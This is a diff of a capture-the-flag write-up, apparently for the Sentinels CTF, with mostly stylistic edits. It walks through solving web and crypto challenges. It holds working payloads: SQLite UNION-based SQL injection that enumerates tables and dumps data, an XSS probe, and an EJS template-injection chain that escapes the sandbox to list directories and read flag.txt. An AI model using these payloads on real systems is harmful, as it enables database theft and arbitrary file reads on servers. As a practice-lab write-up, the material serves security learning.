@@ -6,7 +6,6 @@ title: "Sentinels CTF challenges"
 https://sentinelsofvigil.ctfd.io/team
 
 ## > Tiers of Naughtiness (Web, 150)
-according to the main page of the challenge, the challenge author tried to make the chal blind sql but failed miserably
 
 upon following the challenge instructions and entering 'playitprobro' into the url parameter, we are given the output
 
@@ -21,19 +20,22 @@ we systematically increase the number of NULL's in the payload until the app sto
 payload | result
 ?name=' UNION SELECT NULL, NULL, NULL-- | NAUGHTY: None is in tier -> None
 
-now, we determine which columns are visible in the output with payload `?name=' UNION SELECT 'AAA','BBB','CCC'--+`, producing output
+the database has accepted our offering of three NULLs and we can proceed forth. now, we determine which columns are visible in the output with payload `?name=' UNION SELECT 'AAA','BBB','CCC'--+`, producing output
 
 `NAUGHTY: BBB is in tier -> CCC`
 
 i attempt to list the names of tables using the payload `?name=' UNION SELECT NULL,database(),version()--+` but this threw an SQL Error: no such function: database.
 
 i then reattempt using a payload designed for sqlite `?name=' UNION SELECT NULL,name,type FROM sqlite_master WHERE type='table'--+`, which produces output 
+
 `NAUGHTY: tier_one_secret_123081223_autonau is in tier -> table`
 
-we've found an interesting table. read its columns by: `?name=' UNION SELECT NULL,name,type FROM pragma_table_info('tier_one_secret_123081223_autonau')--+`
+we found something tasty. use the payload `?name=' UNION SELECT NULL,name,type FROM pragma_table_info('tier_one_secret_123081223_autonau')--+` to read its columns
+
 `NAUGHTY: hahah_hi_user is in tier -> TEXT`
 
-now, directly dump the flag: `?name=' UNION SELECT NULL,hahah_hi_user,NULL FROM tier_one_secret_123081223_autonau--+`
+now, directly dump the flag: `?name=' UNION SELECT NULL,hahah_hi_user,NULL FROM tier_one_secret_123081223_autonau--+`. this produces the output:
+
 `NAUGHTY: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( } is in tier -> None`
 
 flag: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( }
@@ -42,11 +44,11 @@ flag: SENTI{my_blind_sql_injection_chall_failed_so_heres_a_normal_one :( }
 ## > Fuzz (Web, 150)
 https://sentinelsofvigil-fuzz.chals.io
 
-web fuzzing is testing various inputs for a web app and hoping to induce unwanted behaviour.
+web fuzzing is testing various inputs for a web app and hoping to induce unwanted behaviour, basically just poke it until it screams
 
 in this website, we are provided a text input. upon submitting the input, the app reflects the input.
 
-using the payload `javascript <script>alert(1337)</script>` suggests XSS but nothing much can be done with that
+my first instinct was using the payload `javascript <script>alert(1337)</script>`, which successfully reflected an alert popup. this suggests XSS but nothing much can be done with that alone
 
 using the payload `sql ' OR 1=1;--` or similar simply reflects the input as is with no errors thrown, suggesting no sqli vulnerability
 
@@ -54,12 +56,14 @@ next i attempted ssti using the jinja2 payload `jinja2{{7*7}}` but the input was
 
 i then did some googling and found the payload `{{<%[%'"}}%\.` on https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/, which managed to throw an error, 'Error: Could not find matching close tag for "<%".'
 
-according to chatgpt this error comes from EJS (embedded javascript)
+bingo. according to chatgpt this error comes from EJS (embedded javascript)
 
 the payload `<%= require('fs').readdirSync('.') %>` yields an error
 'ReferenceError: ejs:1 >> 1 Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'
 
-this suggests that the local environment doesn't have require, this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'
+it looks like `require` is off limits... directly...
+
+this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'
 
 we want to read flag.txt, this can be done using the payload `<%= this.constructor.constructor("return process.mainModule.require('fs').readFileSync('flag.txt', 'utf8')")() %>`
 
@@ -160,12 +164,16 @@ by putting it into chatgpt and telling it the rules, we can uncover the flag.
 flag: SENTI{I_L0v3_GP!1!}
 
 ## > Nonsense (Crypto, 150)
-we are given a string of emojis, 🥰😆🙂😘🤣{😚😂😛😁🤣😁😛🙃😗😁🙃😘😂🤣🥰} which obviously resembles a flag format.
+we are given a very suspicious looking string of emojis, 🥰😆🙂😘🤣{😚😂😛😁🤣😁😛🙃😗😁🙃😘😂🤣🥰} which obviously resembles a flag format.
 
-at first, i attempted to tackle this by moduloing the unicode of each emoji by 26 to find a correlation by looking at the first five emojis which should correspond to SENTI, but this yielded no results
+my first thought was that these must be Unicode numbers mod 26, because surely the first five would map to SENTI (it didnt)
 
-a friend then figured out that the emojis correspond to the first 26 emojis on a phone keypad. with this, we can uncover the flag.
+a friend then figured out that the emojis correspond to the first 26 emojis on a phone keypad, meaning each emoji = a letter A–Z.
 
-23, 8, 25, 4, 9, 4, 25, 15, 21, 4, 15, 20, 8, 9, 19 = W H Y D I D Y O U D O T H I S
+`23, 8, 25, 4, 9, 4, 25, 15, 21, 4, 15, 20, 8, 9, 19`
+
+which translates to 
+
+`W H Y D I D Y O U D O T H I S`
 
 flag: SENTI{WHYDIDYOUDOTHIS}
